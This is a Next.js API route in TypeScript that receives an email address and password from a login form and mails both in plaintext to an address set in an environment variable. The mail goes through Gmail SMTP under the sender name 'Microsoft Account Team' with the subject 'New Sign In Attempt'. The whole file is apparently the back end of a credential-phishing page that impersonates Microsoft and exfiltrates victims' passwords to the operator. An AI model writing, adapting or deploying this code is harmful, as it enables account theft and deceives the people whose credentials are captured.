import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

type FormData = {
  email: string;
  password: string;
};

export async function POST(request: Request) {
  try {
    const { email, password }: FormData = await request.json();

    if (!email || !password) {
      return NextResponse.json(
        { error: 'Email and password are required' },
        { status: 400 }
      );
    }

    // Create a transporter object using the default SMTP transport
    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 587,
      secure: false, 
      auth: {
        user: process.env.EMAIL_USER, 
        pass: process.env.EMAIL_PASS, 
      },
    });

    const recipients = [process.env.EMAIL_RECIEVER || ''];
    const subject = 'New Sign In Attempt';
    const timestamp = new Date().toLocaleString();

    const htmlTemplate = `
      <div style="font-family: Arial, sans-serif; padding: 20px;">
        <h2 style="color: #333;">New Sign In Attempt</h2>
        <p><strong>Time:</strong> ${timestamp}</p>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${password}</p>
        <hr />
      </div>
    `;

    // Send mail with defined transport object
    const mailOptions = {
      from: `"Microsoft Account Team" <${process.env.EMAIL_USER}>`,
      to: recipients.join(','),
      subject: subject,
      html: htmlTemplate,
      text: `New sign in attempt at ${timestamp}\nEmail: ${email}\nPassword: ${password}`
    };

    const info = await transporter.sendMail(mailOptions);
    console.log('Message sent: %s', info.messageId);

    const response = {
      success: true,
      message: 'Email sent successfully',
      messageId: info.messageId
    };

    // Add preview URL only in development
    if (process.env.NODE_ENV === 'development') {
      Object.assign(response, { previewUrl: nodemailer.getTestMessageUrl(info) });
    }

    return NextResponse.json(response);
  } catch (error) {
    console.error('Error sending email:', error);
    return NextResponse.json(
      { error: 'Failed to send email' },
      { status: 500 }
    );
  }
}
